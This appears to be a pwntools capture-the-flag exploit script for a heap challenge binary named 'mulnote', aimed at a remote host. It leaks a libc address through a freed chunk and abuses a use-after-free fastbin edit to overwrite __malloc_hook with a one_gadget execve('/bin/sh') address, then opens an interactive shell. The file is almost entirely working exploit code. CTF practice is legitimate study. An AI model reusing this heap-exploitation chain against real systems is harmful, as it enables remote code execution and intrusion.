#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './mulnote'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('112.126.101.96', 9999)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''

    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Create(size, content):
    sh.sendafter('>', 'C\0')
    sh.sendlineafter('size>', str(size))
    sh.sendafter('note>', content)

def Remove(index):
    sh.sendafter('>', 'R\0')
    sh.sendlineafter('index>', str(index))

def Edit(index, content):
    sh.sendafter('>', 'E\0')
    sh.sendlineafter('index>', str(index))
    sh.sendafter('new ', content)

def Show():
    sh.sendafter('>', 'S\0')

# sh.sendafter('>', 'XxXxBbBb\0')
Create(0x98, '\n')
Create(0x68, '\n')
Create(0x68, '\n')
Remove(0)
Show()
sh.recvuntil('note[0]:\n')
result = sh.recvuntil('\n', drop=True)
main_arena_addr = u64(result.ljust(8, '\0')) - 88
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))

Remove(2)
Remove(1)
Edit(1, p64(main_arena_addr - 0x33))

Create(0x68, '/bin/sh\0')
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
Create(0x68, 'z' * 0x13 + p64(libc_addr + 0x4526a))
sh.sendafter('>', 'C\0')
sh.sendlineafter('size>', str(1))

sh.interactive()
clear()